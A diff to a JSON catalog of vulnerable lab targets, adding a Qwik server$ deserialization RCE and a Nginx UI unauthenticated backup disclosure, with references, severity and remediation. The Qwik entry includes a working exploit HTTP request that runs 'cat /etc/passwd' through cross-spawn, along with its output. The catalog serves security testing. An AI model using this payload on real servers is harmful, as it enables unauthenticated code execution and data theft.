@@ -1,5 +1,131 @@
 [
   {
+    "id": "vt-2026-27971",
+    "info": {
+      "name": "Qwik - Unauthenticated RCE via server$ Deserialization",
+      "author": "omarkurt",
+      "description": "Qwik framework versions 1.19.0 and prior contain an unsafe deserialization\nvulnerability in the server$ RPC mechanism. The importSymbol function in the\nserver platform falls back to using require() with a user-controlled URL path\nwhen a QRL symbol is not found in the pre-registered symbols map. This allows\nany unauthenticated attacker to execute arbitrary code on the server with a\nsingle HTTP request. Affects any deployment where require() is available at\nruntime (standard Node.js).\n",
+      "type": "CVE",
+      "targets": [
+        "qwik"
+      ],
+      "cve": "CVE-2026-27971",
+      "cwe": "CWE-502",
+      "cvss": {
+        "score": 9.2,
+        "severity": "critical",
+        "metrics": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+      },
+      "affected_versions": [
+        "<= 1.19.0"
+      ],
+      "fixed_version": "1.19.1",
+      "tags": [
+        "rce",
+        "deserialization",
+        "qwik",
+        "cve-2026",
+        "unauthenticated",
+        "nodejs"
+      ],
+      "references": [
+        "https://github.com/QwikDev/qwik/security/advisories/GHSA-p9x5-jp3h-96mm",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-27971",
+        "https://vulnerabletarget.com/VT-2026-27971"
+      ]
+    },
+    "vulnerabilities": [
+      {
+        "id": "server_rce",
+        "name": "RCE via server$ QRL Deserialization",
+        "description": "The server$ RPC endpoint deserializes QRL objects from application/qwik-json\nPOST requests. The importSymbol function uses require() with attacker-controlled\nmodule paths, allowing arbitrary module loading and code execution.\n",
+        "endpoint": "/",
+        "method": "POST",
+        "param": "qfunc",
+        "request": "POST /?qfunc=sync HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/qwik-json\nX-QRL: sync\nOrigin: http://{{Hostname}}\n\n{\"_objs\":[\"\\u0002./node_modules/cross-spawn/index#sync\",\"cat\",\"/etc/passwd\",[\"2\"],[\"0\",\"1\",\"3\"]],\"_entry\":\"4\"}\n",
+        "response": "HTTP/1.1 200 OK\nContent-Type: application/qwik-json\n\n{\"result\":\"root:x:0:0:root:/root:/bin/sh\\nbin:x:1:1:bin:/bin:/sbin/nologin:\\n\"}\n"
+      }
+    ],
+    "technical": "The vulnerability exists in packages/qwik/src/server/platform.ts in the\nimportSymbol function. When a QRL references a symbol not found in the\npre-registered symbols map (__qwik_reg_symbols), the code falls back to\nrequire() with the attacker-controlled URL from the QRL. The server$\nRPC mechanism deserializes QRL objects from POST requests with\nContent-Type: application/qwik-json, allowing an attacker to craft a\nQRL pointing to any Node.js module (e.g., child_process) and invoke\nany exported function (e.g., execSync) with arbitrary arguments.\nThe fix in 1.19.1 removes the require() fallback and throws an error\ninstead when a symbol is not pre-registered.\n",
+    "impact": "An unauthenticated attacker can achieve Remote Code Execution on any\nQwik application running on Node.js. This allows full server compromise\nincluding data theft, lateral movement, and service disruption.\n",
+    "remediation": [
+      "Upgrade @builder.io/qwik to version 1.19.1 or later",
+      "Deploy on edge runtimes without require() (Cloudflare Workers, Deno) as mitigation"
+    ],
+    "poc": {
+      "nuclei": [
+        "vt-2026-27971.nuclei.yaml"
+      ]
+    },
+    "providers": {
+      "docker-compose": {
+        "path": "docker-compose.yaml"
+      }
+    },
+    "post-install": [
+      "Access the application at http://localhost:3000",
+      "The Qwik app runs in SSR dev mode with server$ RPC enabled"
+    ],
+    "category": "cves",
+    "added_date": "2026-03-08T23:21:31+03:00"
+  },
+  {
+    "id": "vt-2026-27944",
+    "info": {
+      "name": "Nginx UI - Unauthenticated Backup Download with Encryption Key Disclosure",
+      "author": "omarkurt",
+      "description": "Nginx UI is a web user interface for managing Nginx web servers. Versions prior to \n2.3.3 contain a critical information disclosure vulnerability. The /api/backup endpoint \nis accessible without authentication and discloses the AES encryption key and initialization \nvector (IV) in the X-Backup-Security HTTP response header. This allows an unauthenticated \nattacker to download a full system backup containing sensitive data including admin credentials, \nsession tokens, SSL private keys, and complete Nginx configurations.\n",
+      "targets": [
+        "nginx-ui"
+      ],
+      "type": "CVE",
+      "cve": "CVE-2026-27944",
+      "cwe": "CWE-306",
+      "cvss": {
+        "score": 9.8,
+        "metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "affected_versions": [
+        "< 2.3.3"
+      ],
+      "fixed_version": "2.3.3",
+      "tags": [
+        "nginx-ui",
+        "backup",
+        "information-disclosure",
+        "unauthenticated"
+      ]
+    },
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-27944",
+      "https://github.com/advisories/GHSA-4x88-6m79-q5g5",
+      "https://www.tenable.com/security/research/tra-2026-17",
+      "https://www.thehackerwire.com/nginx-ui-unauthenticated-backup-disclosure-cve-2026-27944/",
+      "https://github.com/0xJacky/nginx-ui/releases/tag/v2.3.3"
+    ],
+    "poc": {
+      "nuclei": [
+        "vt-2026-27944.nuclei.yaml"
+      ]
+    },
+    "remediation": [
+      "Upgrade to Nginx UI version 2.3.3 or later immediately",
+      "Implement authentication middleware on /api/backup endpoint",
+      "Do not transmit encryption keys in HTTP response headers",
+      "Use proper key management (KMS, HSM, or separate secure key storage)"
+    ],
+    "providers": {
+      "docker-compose": {
+        "path": "docker-compose.yaml"
+      }
+    },
+    "post-install": [
+      "http://localhost:9000"
+    ],
+    "category": "cves",
+    "added_date": "2026-03-08T23:21:31+03:00"
+  },
+  {
     "id": "vt-dagu",
     "info": {
       "name": "Dagu Workflow Engine - Unauthenticated Remote Code Execution",
